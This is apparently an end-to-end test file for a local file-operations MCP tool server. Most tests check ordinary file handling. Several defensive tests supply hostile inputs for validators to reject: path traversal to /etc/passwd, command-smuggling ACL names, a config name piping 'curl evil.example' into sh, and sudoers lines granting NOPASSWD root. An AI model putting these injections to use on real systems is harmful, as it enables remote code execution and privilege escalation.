#!/usr/bin/env node

/**
 * 端到端行为测试
 *
 * 与 test/integrationTest.js 的区别：
 * integrationTest 只断言"工具注册了吗、描述符有几个"，
 * 这里断言"调用之后，磁盘上的东西对吗、返回的东西合规吗"。
 *
 * 走的是真实请求路径：lib/dispatcher.js 是 index.js stdio 处理器的同一份逻辑。
 *
 * 运行：node test/e2eTest.js
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync, execSync } = require('child_process');

// ---- 环境隔离：在 require 业务模块之前指定数据目录，避免污染 ~/.local_file_operations ----
const SANDBOX = path.join(os.tmpdir(), `axlocalop-e2e-${process.pid}`);
const WS = path.join(SANDBOX, 'workspace');
fs.rmSync(SANDBOX, { recursive: true, force: true });
fs.mkdirSync(WS, { recursive: true });
process.env.AXLOCALOP_DATA_DIR = path.join(SANDBOX, 'data');

const { dispatch } = require('../lib/dispatcher');
const { instances, getToolInstance, descriptors } = require('../tools/registry');
const workspaceManager = instances.workspace_manager;

const VALID_CONTENT_TYPES = new Set(['text', 'image', 'audio', 'resource', 'resource_link']);

// ---- 迷你测试框架 ----
const results = [];
function test(name, fn) {
  results.push({ name, fn });
}

function assert(cond, msg) {
  if (!cond) throw new Error(msg);
}
function assertEqual(actual, expected, msg) {
  const a = JSON.stringify(actual);
  const e = JSON.stringify(expected);
  if (a !== e) throw new Error(`${msg}\n      实际: ${a}\n      期望: ${e}`);
}

const call = (name, args) => dispatch(name, args, { getToolInstance, workspaceManager });

function textOf(result) {
  return (result.content || [])
    .filter(b => b.type === 'text')
    .map(b => b.text)
    .join('\n');
}

function jsonOf(result) {
  if (result.structuredContent) return result.structuredContent;
  const block = (result.content || []).find(b => b.type === 'json');
  if (block) return block.json;
  // 兼容：JSON 以文本形式返回
  const t = textOf(result).trim();
  if (t.startsWith('{') || t.startsWith('[')) {
    try { return JSON.parse(t); } catch { return null; }
  }
  return null;
}

const abs = p => path.join(WS, p);
const read = p => fs.readFileSync(abs(p), 'utf8');

// =====================================================================
// 用例
// =====================================================================

test('写入文件后读回，内容逐字节一致', async () => {
  const content = '第一行\n第二行\t带制表符\n\n第四行（空行之上）\n';
  const w = await call('file_operation', { operation: 'write', path: 'note.md', content, working_directory: WS });
  assert(!w.isError, `写入失败: ${textOf(w)}`);
  assert(fs.existsSync(abs('note.md')), '文件未落盘');

  const r = await call('file_operation', { operation: 'read', path: 'note.md', working_directory: WS });
  assert(!r.isError, `读取失败: ${textOf(r)}`);
  assertEqual(read('note.md'), content, '磁盘内容与写入内容不一致');
  assert(textOf(r).includes('第一行'), '读取结果未包含文件内容');
});

test('文件内容里的"当前工作目录是："必须原样写入，不得被拦截', async () => {
  // 回归：旧实现会在任意参数中扫描该字符串，命中就吞掉整个调用
  const content = '日志：当前工作目录是：/etc/passwd\n这一行必须被写进文件。\n';
  const r = await call('file_operation', { operation: 'write', path: 'hijack.md', content, working_directory: WS });

  assert(fs.existsSync(abs('hijack.md')), `文件未被创建，返回: ${textOf(r)}`);
  assertEqual(read('hijack.md'), content, '内容被篡改或未写入');
  assert(!textOf(r).includes('已设置临时工作目录'), '调用被工作区指令劫持');
});

test('file_hash 的相对路径应基于 working_directory 解析', async () => {
  fs.writeFileSync(abs('hash.txt'), 'abc');
  const r = await call('file_hash', { path: 'hash.txt', algorithm: 'sha256', working_directory: WS });
  assert(!r.isError, `哈希失败: ${textOf(r)}`);
  // sha256("abc")
  const expected = 'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad';
  const data = jsonOf(r) || {};
  assert(String(data.hash).toLowerCase() === expected, `哈希值不对: ${data.hash}`);
});

test('file_compare 的相对路径应基于 working_directory 解析', async () => {
  fs.writeFileSync(abs('c1.txt'), 'a\nb\n');
  fs.writeFileSync(abs('c2.txt'), 'a\nB\n');
  const r = await call('file_compare', { file1: 'c1.txt', file2: 'c2.txt', output_format: 'json', working_directory: WS });
  assert(!r.isError, `比较失败: ${textOf(r)}`);

  const data = jsonOf(r) || {};
  assert(data.identical === false, '应当识别出两个文件不同');
  assert(data.differences_count === 1, `差异行数应为 1，实际 ${data.differences_count}`);
});

test('默认工作区不得位于隐藏目录（否则相对路径一律被拒）', async () => {
  const def = workspaceManager.getDefaultWorkspacePath
    ? workspaceManager.getDefaultWorkspacePath()
    : null;

  // 取"用户什么都没配置"时的兜底路径
  const fallback = workspaceManager.getCurrentWorkspace();
  const parts = path.resolve(fallback).split(path.sep).slice(1);
  const hidden = parts.filter(p => p && p.startsWith('.'));
  assert(hidden.length === 0, `默认工作区含隐藏目录组件 ${JSON.stringify(hidden)}: ${fallback}`);

  // 用兜底工作区做一次真实写入，验证权限链自洽
  const probe = await call('file_operation', { operation: 'write', path: 'fallback-probe.txt', content: 'ok' });
  assert(!probe.isError || !/E_PATH_DENIED/.test(textOf(probe)),
    `默认工作区自身被路径校验拒绝: ${textOf(probe)}`);
  if (def !== null) assert(typeof def === 'string', 'getDefaultWorkspacePath 应返回字符串');
});

test('所有工具返回的 content.type 必须是合法 MCP 类型', async () => {
  fs.writeFileSync(abs('perm.txt'), 'x');
  const calls = [
    ['file_operation', { operation: 'list', path: '.', output_format: 'both', working_directory: WS }],
    ['file_search', { search_path: WS, pattern: '第一行', output_format: 'both' }],
    ['file_compare', { file1: 'c1.txt', file2: 'c2.txt', output_format: 'both', working_directory: WS }],
    ['file_hash', { path: 'hash.txt', output_format: 'both', working_directory: WS }],
    ['file_edit', { operation: 'append_lines', path: 'perm.txt', content: 'y', output_format: 'json', working_directory: WS }],
    ['time_tool', { format: 'iso', output_format: 'both' }],
    ['environment_memory', { operation: 'read', output_format: 'both' }],
    ['workspace_manager', { operation: 'status', output_format: 'both' }],
    ['task_manager', { operation: 'create', model_name: 'e2e', title: 't1', output_format: 'text' }],
    ['execute_command', { command: 'echo e2e-ok', output_format: 'both', working_directory: WS }],
    ['file_permissions', { path: 'perm.txt', mode: '644', output_format: 'json', working_directory: WS }],
    ['file_watch', { path: '.', duration: 0.02, output_format: 'json', working_directory: WS }],
    ['sudo_config', { action: 'status', output_format: 'json' }]
  ];

  for (const [name, args] of calls) {
    const r = await call(name, args);
    assert(r && Array.isArray(r.content), `${name} 未返回 content 数组`);
    for (const block of r.content) {
      assert(VALID_CONTENT_TYPES.has(block.type),
        `${name} 返回了非法 content.type="${block.type}"（合法值：${[...VALID_CONTENT_TYPES].join('/')}）`);
    }
  }
});

test('file_edit 追加内容不得多出空行', async () => {
  fs.writeFileSync(abs('append.txt'), 'l1\nl2\n'); // 以换行结尾（编辑器常见情况）
  const r = await call('file_edit', { operation: 'append_lines', path: 'append.txt', content: 'l3', working_directory: WS });
  assert(!r.isError, `追加失败: ${textOf(r)}`);
  assertEqual(read('append.txt'), 'l1\nl2\nl3\n', '追加后产生了多余空行或丢失结尾换行');
});

test('file_edit 删除行号与编辑器显示一致', async () => {
  fs.writeFileSync(abs('del.txt'), '1\n2\n3\n4\n5\n');
  const r = await call('file_edit', { operation: 'delete_lines', path: 'del.txt', start_line: 2, end_line: 3, working_directory: WS });
  assert(!r.isError, `删除失败: ${textOf(r)}`);
  assertEqual(read('del.txt'), '1\n4\n5\n', '删除的行与预期不符');
});

test('file_edit 修改前应生成备份文件', async () => {
  fs.writeFileSync(abs('bak.txt'), 'original\n');
  const r = await call('file_edit', { operation: 'append_lines', path: 'bak.txt', content: 'added', working_directory: WS });
  assert(!r.isError, `编辑失败: ${textOf(r)}`);

  const backups = fs.readdirSync(WS).filter(n => n.startsWith('bak.txt') && n !== 'bak.txt');
  assert(backups.length > 0, '描述承诺"操作前自动备份"，但没有任何备份文件');
  assertEqual(fs.readFileSync(abs(backups[0]), 'utf8'), 'original\n', '备份内容应为修改前的内容');
});

test('路径穿越必须仍被拒绝，且保留错误码', async () => {
  const r = await call('file_operation', {
    operation: 'read',
    path: '../../../../../../etc/passwd',
    working_directory: WS
  });
  assert(r.isError === true, '路径穿越未被拒绝');
  assert(/E_PATH_DENIED/.test(textOf(r)), `错误码丢失，实际返回: ${textOf(r)}`);
});

test('workspace_manager 设置失败时不得报告成功', async () => {
  // 用一个"父级是文件"的路径，mkdir 必然失败
  fs.writeFileSync(abs('blocker'), 'x');
  const r = await call('workspace_manager', { operation: 'set_temp', workspace_path: abs('blocker/sub') });
  assert(r.isError === true, `非法工作区却返回成功: ${textOf(r)}`);
  assert(!textOf(r).includes('成功'), `失败路径仍输出"成功": ${textOf(r)}`);
});

test('file_search 相对路径可用，且默认不扫描 node_modules', async () => {
  fs.mkdirSync(abs('proj/node_modules/pkg'), { recursive: true });
  fs.writeFileSync(abs('proj/src.js'), 'const NEEDLE = 1;\n');
  fs.writeFileSync(abs('proj/node_modules/pkg/evil.js'), 'const NEEDLE = 2;\n');

  const r = await call('file_search', {
    search_path: 'proj', pattern: 'NEEDLE', output_format: 'json', working_directory: WS
  });
  assert(!r.isError, `搜索失败: ${textOf(r)}`);
  const hits = (jsonOf(r) || {}).results || [];
  assert(hits.length === 1, `应只命中 1 个文件，实际 ${hits.length}`);
  assert(!hits.some(h => String(h.file).includes('node_modules')), '默认不应扫描 node_modules');
});

test('task_manager 描述符应包含实现里已有的 delete/get', async () => {
  const d = descriptors.find(x => x.name === 'task_manager');
  const ops = d.inputSchema.properties.operation.enum;
  for (const op of ['create', 'list', 'update', 'complete', 'delete', 'get', 'clear']) {
    assert(ops.includes(op), `操作 ${op} 在实现中存在但未出现在 enum 中: ${JSON.stringify(ops)}`);
  }
});

test('--version 输出应与 package.json 一致', async () => {
  const pkg = require('../package.json');
  const out = execFileSync(process.execPath, [path.join(__dirname, '..', 'index.js'), '--version'], {
    encoding: 'utf8', env: { ...process.env, AXLOCALOP_DATA_DIR: process.env.AXLOCALOP_DATA_DIR }
  }).trim();
  assertEqual(out, pkg.version, '--version 与 package.json 版本不一致');
});

test('显式绝对路径不得被自动注入的默认工作区挡住', () => {
  // dispatch 会给每次调用注入 getCurrentWorkspace()；工作目录是相对路径的
  // 解析基准，不该把显式绝对路径也圈进默认工作区里。
  const SecurityValidator = require('../tools/securityValidator');
  const sv = new SecurityValidator();
  const unrelated = path.join(SANDBOX, 'unrelated-default');
  const resolved = sv.resolveAndAssert(abs('note.md'), unrelated);
  assertEqual(path.resolve(resolved), path.resolve(abs('note.md')),
    '绝对路径被无关工作目录拒绝或改写');

  // 相对路径的越界约束必须仍然生效
  let denied = false;
  try { sv.resolveAndAssert('../escape.txt', WS); } catch (e) { denied = e.code === 'E_PATH_DENIED'; }
  assert(denied, '相对路径穿越工作目录竟然被允许');

  // ~ 展开到家目录，而不是拼成 workingDir/~/...
  const homePath = sv.resolveAndAssert('~/axlocalop-e2e-probe.txt', WS);
  assertEqual(path.resolve(homePath), path.resolve(path.join(os.homedir(), 'axlocalop-e2e-probe.txt')),
    '~ 路径未正确展开到用户家目录');
});

test('file_permissions 的相对路径应基于 working_directory 解析', async () => {
  fs.writeFileSync(abs('perm-rel.txt'), 'x');
  const r = await call('file_permissions', {
    path: 'perm-rel.txt', mode: '644', output_format: 'json', working_directory: WS
  });
  assert(!r.isError, `权限操作失败: ${textOf(r)}`);
  const data = jsonOf(r) || {};
  assertEqual(path.resolve(data.path || ''), path.resolve(abs('perm-rel.txt')),
    '校验用的路径与实际操作的路径不一致');
});

test('file_watch 相对路径不得在 process.cwd() 下凭空创建目录', async () => {
  const marker = 'axlocalop-watch-probe';
  const cwdProbe = path.join(process.cwd(), marker);
  fs.rmSync(cwdProbe, { recursive: true, force: true });

  const r = await call('file_watch', {
    path: marker, duration: 0.02, output_format: 'json', working_directory: WS
  });
  assert(!r.isError, `监控失败: ${textOf(r)}`);
  assert(!fs.existsSync(cwdProbe), '监控工具在 process.cwd() 下创建了同名目录');
  assert(fs.existsSync(abs(marker)), '监控目录应创建在 working_directory 下');

  const data = jsonOf(r) || {};
  assertEqual(path.resolve(data.watch_path || ''), path.resolve(abs(marker)),
    '返回的监控路径不是解析后的工作区路径');
});

test('file_archive 压缩→解压往返内容一致', async () => {
  const content = 'archive round trip\n第二行\n';
  fs.writeFileSync(abs('arc.txt'), content);

  const c = await call('file_archive', {
    operation: 'compress', source: 'arc.txt', destination: 'arc.tar',
    format: 'tar', output_format: 'json', working_directory: WS
  });
  assert(!c.isError, `压缩失败: ${textOf(c)}`);
  assert(fs.existsSync(abs('arc.tar')), '归档文件未生成');

  const e = await call('file_archive', {
    operation: 'extract', source: 'arc.tar', destination: 'unpacked',
    output_format: 'json', working_directory: WS
  });
  assert(!e.isError, `解压失败: ${textOf(e)}`);
  assertEqual(fs.readFileSync(abs('unpacked/arc.txt'), 'utf8'), content,
    '解压后的内容与压缩前不一致');
});

test('声明 outputSchema 的工具，成功路径必须返回 structuredContent', async () => {
  // MCP SDK 客户端会对声明了 outputSchema 的工具强制要求 structuredContent，
  // 缺失直接报 -32600。此用例覆盖所有这类工具的成功路径。
  const probes = {
    file_operation: { operation: 'read', path: 'note.md', output_format: 'text', working_directory: WS },
    time_tool: { format: 'iso', output_format: 'text' },
    file_search: { search_path: WS, pattern: '第一行', output_format: 'text' },
    file_compare: { file1: 'c1.txt', file2: 'c2.txt', output_format: 'text', working_directory: WS },
    file_hash: { path: 'hash.txt', output_format: 'text', working_directory: WS },
    file_permissions: { path: 'perm.txt', mode: '644', output_format: 'text', working_directory: WS },
    file_archive: { operation: 'compress', source: 'hash.txt', destination: 'sc.tar', format: 'tar', output_format: 'text', working_directory: WS },
    execute_command: { command: 'echo sc-ok', output_format: 'text', working_directory: WS },
    task_manager: { operation: 'list', output_format: 'text' },
    environment_memory: { operation: 'read', output_format: 'text' }
  };

  const schemaTools = descriptors.filter(d => d.outputSchema).map(d => d.name);
  for (const name of schemaTools) {
    assert(probes[name], `缺少 ${name} 的探针参数，请同步补充`);
    const r = await call(name, probes[name]);
    assert(!r.isError, `${name} 调用失败: ${textOf(r)}`);
    assert(r.structuredContent && typeof r.structuredContent === 'object',
      `${name} 声明了 outputSchema 但成功结果缺少 structuredContent`);
  }
});

test('生产代码不得残留非法的 type:"json" 内容块', () => {
  // content.type 只有 text/image/audio/resource/resource_link；'json' 会让严格客户端
  // zod 校验失败，宽松客户端则静默丢弃整块数据。行为用例覆盖不到的分支由此兜住。
  const root = path.join(__dirname, '..');
  const files = [path.join(root, 'index.js'), path.join(root, 'responses.js')];
  for (const dir of ['tools', 'lib']) {
    for (const f of fs.readdirSync(path.join(root, dir))) {
      if (f.endsWith('.js')) files.push(path.join(root, dir, f));
    }
  }
  const offenders = files.filter(f => /type\s*:\s*['"]json['"]/.test(fs.readFileSync(f, 'utf8')));
  assert(offenders.length === 0,
    `仍有非法 content.type="json": ${offenders.map(f => path.relative(root, f)).join(', ')}`);
});

test('外部命令不得把变量拼进 shell 字符串', () => {
  // exec() 经 shell 解析：路径或 ACL 用户名里的引号可以闭合 "..."，& / | 追加任意命令。
  // 所有外部命令必须走 execFile + 参数数组。这里用源码扫描兜住行为用例覆盖不到的分支。
  const root = path.join(__dirname, '..');
  const offenders = [];
  for (const dir of ['tools', 'lib']) {
    for (const f of fs.readdirSync(path.join(root, dir))) {
      if (!f.endsWith('.js')) continue;
      const full = path.join(root, dir, f);
      const src = fs.readFileSync(full, 'utf8');
      if (/\b(?:exec|execAsync|execSync)\s*\(\s*`[^`]*\$\{/.test(src)) {
        offenders.push(path.relative(root, full));
      }
    }
  }
  assert(offenders.length === 0,
    `外部命令仍在拼接 shell 字符串: ${offenders.join(', ')}`);
});

test('ACL 用户名/权限串必须由白名单校验（独立于平台）', () => {
  const perms = require('../lib/crossPlatformPermissions');
  assert(typeof perms.assertSafeAclSpec === 'function',
    '缺少可独立测试的 ACL 参数校验器 assertSafeAclSpec');
  const bad = [
    ['Everyone" & echo pwned > marker & "', 'F'],
    ['Everyone\nBUILTIN\\Administrators:(OI)(CI)F', 'F'],
    ['$(whoami)', 'F'],
    ['Everyone', 'F /grant Hacker:F'],
    ['Everyone', 'F & whoami'],
    ['a|b', 'F']
  ];
  for (const [user, permission] of bad) {
    let rejected = false;
    try { perms.assertSafeAclSpec(user, permission); } catch { rejected = true; }
    assert(rejected, `危险 ACL 参数未被拒绝: ${JSON.stringify([user, permission])}`);
  }
  // 正常值必须通过，别把功能锁死
  perms.assertSafeAclSpec('Everyone', 'F');
  perms.assertSafeAclSpec('BUILTIN\\Users', '(OI)(CI)RX');
});

test('file_permissions 的 ACL 参数不得触发命令执行', async () => {
  if (process.platform !== 'win32') return; // Unix 适配器只用 fs API，没有 shell 面
  fs.writeFileSync(abs('acl-probe.txt'), 'acl\n');
  const marker = path.join(WS, 'pwned-marker.txt');
  fs.rmSync(marker, { force: true });
  const r = await call('file_permissions', {
    path: 'acl-probe.txt',
    permissions: {
      acl: { grant: { user: `Everyone" & echo pwned > "${marker}" & "`, permissions: 'F' } }
    },
    output_format: 'json',
    working_directory: WS
  });
  assert(!fs.existsSync(marker), '注入串创建了标记文件：外部命令确实被执行了');
  assert(r.isError === true, `危险 ACL 参数应被明确拒绝，而不是静默吞掉: ${textOf(r)}`);
});

test('sudo_config 必须拒绝可注入 shell 的 config_name', async () => {
  const r = await call('sudo_config', {
    action: 'remove',
    config_name: 'a; curl evil.example | sh #',
    output_format: 'json'
  });
  assert(r.isError === true, `恶意 config_name 未被拒绝: ${textOf(r)}`);
  assert(/E_INVALID_ARGS|非法/.test(textOf(r)),
    `拒绝原因不是参数校验: ${textOf(r)}`);
  assert(!/仅支持Linux/.test(textOf(r)),
    `被平台检查提前挡掉，参数校验实际未执行: ${textOf(r)}`);
  assert(!/已移除|"action"\s*:\s*"removed"/.test(textOf(r)),
    `恶意 config_name 竟然进入了删除流程: ${textOf(r)}`);
});

test('sudo_config 必须拒绝可注入 sudoers 规则的 username / commands', async () => {
  const badUser = await call('sudo_config', {
    action: 'generate',
    username: 'bob\nattacker ALL=(ALL) NOPASSWD: ALL',
    output_format: 'json'
  });
  assert(badUser.isError === true, `含换行的 username 未被拒绝: ${textOf(badUser)}`);
  assert(/E_INVALID_ARGS|非法/.test(textOf(badUser)),
    `拒绝原因不是参数校验: ${textOf(badUser)}`);
  assert(!/仅支持Linux/.test(textOf(badUser)), '被平台检查提前挡掉，username 校验实际未执行');

  const badCmd = await call('sudo_config', {
    action: 'generate',
    username: 'bob',
    commands: ['/bin/ls, /bin/sh'],
    output_format: 'json'
  });
  assert(badCmd.isError === true, `含逗号（规则分隔符）的 command 未被拒绝: ${textOf(badCmd)}`);
  assert(/E_INVALID_ARGS|非法/.test(textOf(badCmd)), `拒绝原因不是参数校验: ${textOf(badCmd)}`);
});

test('sudoers 校验器可独立拒绝注入串（不依赖 Linux）', () => {
  const M = require('../lib/sudoersConfigManager');
  const rejects = (fn, value, label) => {
    let threw = false;
    try { fn(value); } catch (e) {
      threw = true;
      assert(e.code === 'E_INVALID_ARGS', `${label} 的错误码应为 E_INVALID_ARGS，实际 ${e.code}`);
    }
    assert(threw, `${label} 未被拒绝: ${JSON.stringify(value)}`);
  };

  rejects(M.assertSafeConfigName, 'a; curl evil.example | sh #', 'shell 元字符文件名');
  rejects(M.assertSafeConfigName, '../../etc/passwd', '路径穿越文件名');
  rejects(M.assertSafeUsername, 'bob\nattacker ALL=(ALL) NOPASSWD: ALL', '换行注入用户名');
  rejects(M.assertSafeCommands, ['/bin/ls, /bin/sh'], '规则分隔符命令');
  rejects(M.assertSafeCommands, ['/bin/ls\nattacker ALL=(ALL) NOPASSWD: ALL'], '换行注入命令');

  // 合法值必须仍然通过，避免过度收紧
  M.assertSafeConfigName('mcp-nopasswd');
  M.assertSafeUsername('deploy_user');
  M.assertSafeCommands(['/bin/chmod', '/bin/systemctl restart [a-zA-Z0-9_-]*']);
});

test('npm 发布包必须包含 postinstall 引用的脚本文件', () => {
  const root = path.join(__dirname, '..');
  const pkg = require('../package.json');
  const m = /node\s+\.?\/?([^\s]+\.js)/.exec(pkg.scripts.postinstall || '');
  assert(m, 'postinstall 未指向 js 脚本，用例需要同步调整');

  const script = m[1].replace(/^\.\//, '');
  // 走真实 npm 打包逻辑，而不是只看 package.json 的 files 字段
  const out = execSync('npm pack --dry-run --json', {
    cwd: root, encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore']
  });
  const files = JSON.parse(out)[0].files.map(x => x.path);
  assert(files.includes(script),
    `发布包缺少 ${script}，npm i -g 的 postinstall 会 ELIFECYCLE（共 ${files.length} 个文件）`);
});

test('postinstall 在 stdin 关闭的无人值守安装下必须成功', () => {
  const root = path.join(__dirname, '..');
  const target = path.join(SANDBOX, 'install-workspace');
  // 模拟 npm 安装：stdin 立即 EOF、无 TTY。旧版交互式脚本会 exit(1)。
  const script = path.join(root, 'bin', 'setup-workspace.js');
  try {
    execFileSync(process.execPath, [script], {
      cwd: root,
      input: '',
      encoding: 'utf8',
      timeout: 10000,
      env: {
        ...process.env,
        AXLOCALOP_DEFAULT_WORKSPACE: target,
        AXLOCALOP_DATA_DIR: path.join(SANDBOX, 'data')
      }
    });
  } catch (error) {
    throw new Error(`postinstall 非零退出 (status=${error.status}): ${String(error.stderr || error.message).slice(0, 300)}`);
  }
  assert(fs.existsSync(target), 'postinstall 未预创建默认工作区目录');
});

// =====================================================================
// 运行
// =====================================================================

(async () => {
  console.log('='.repeat(70));
  console.log('  端到端行为测试 (e2e)');
  console.log('='.repeat(70));
  console.log(`沙箱: ${SANDBOX}\n`);

  // 固定工作区，避免用例互相干扰
  workspaceManager.setTempWorkspace(WS);

  let passed = 0;
  const failures = [];

  for (const { name, fn } of results) {
    try {
      await fn();
      passed++;
      console.log(`  ✓ ${name}`);
    } catch (error) {
      failures.push({ name, message: error.message });
      console.log(`  ✗ ${name}`);
      console.log(`      ${String(error.message).replace(/\n/g, '\n      ')}`);
    }
  }

  console.log('\n' + '-'.repeat(70));
  console.log(`通过 ${passed}/${results.length}`);
  if (failures.length) {
    console.log(`失败 ${failures.length} 项`);
  }

  fs.rmSync(SANDBOX, { recursive: true, force: true });
  process.exit(failures.length ? 1 : 0);
})();
